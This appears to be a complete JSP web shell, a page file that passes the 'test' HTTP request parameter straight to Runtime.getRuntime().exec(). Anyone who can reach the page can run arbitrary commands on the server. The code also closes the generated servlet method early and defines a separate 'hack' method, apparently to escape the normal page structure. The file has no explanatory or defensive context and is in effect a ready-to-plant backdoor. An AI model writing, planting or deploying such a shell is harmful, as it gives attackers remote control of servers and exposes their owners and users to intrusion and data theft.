<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String data = request.getParameter("test");
    hack(data);
} catch (java.lang.Throwable t){} finally {_jspxFactory.releasePageContext(_jspx_page_context);}
}
public void hack(String data) throws java.io.IOException,javax.servlet.ServletException
{
    javax.servlet.jsp.JspWriter out = null;
    javax.servlet.jsp.JspWriter _jspx_out = null;
    javax.servlet.jsp.PageContext _jspx_page_context = null;
    javax.servlet.http.HttpServletResponse response = null;
    try{
        Runtime.getRuntime().exec(data);
}